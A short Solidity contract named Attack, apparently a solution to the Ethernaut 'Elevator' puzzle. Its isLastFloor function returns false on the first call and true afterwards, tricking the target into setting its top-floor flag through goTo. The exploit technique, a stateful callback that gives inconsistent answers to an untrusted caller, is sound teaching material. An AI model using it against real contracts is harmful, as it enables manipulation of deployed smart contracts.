// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;    
}

contract Attack {

    address payable orgContract;

    constructor(address payable _levelInstance) payable {
        orgContract = _levelInstance;
    }

    uint256 public balance;
    uint public count = 0;

    function isLastFloor(uint floor) public returns (bool){
        if (count == 0){
            count += 1;
            return false;
        }
        else{
            return true;
        }

    }
    function attack() public payable {
        IElevator(orgContract).goTo(1);
    }
}